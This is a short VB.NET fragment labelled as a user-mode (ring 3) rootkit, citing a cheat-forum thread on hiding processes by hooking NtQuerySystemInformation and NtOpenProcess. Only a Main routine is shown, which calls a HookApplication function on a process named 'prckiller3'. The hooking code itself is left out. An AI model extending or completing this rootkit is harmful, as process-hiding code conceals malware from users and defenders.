Module VbRootkit
    'Ring3 RootKit
    'www.unknowncheats.me/forum/vb-net/144795-vb-net-ring3-rootkit-hide-process-ntquerysysteminformation-and-ntopenprocess.html
...
#End Region
    Sub Main()
        Console.Title = "Hook Proccess Killer"
        'Console.WriteLine("Press enter, and the hook will be done!")
        Console.ReadLine()
        HookApplication("prckiller3")
        Console.ReadLine()
    End Sub
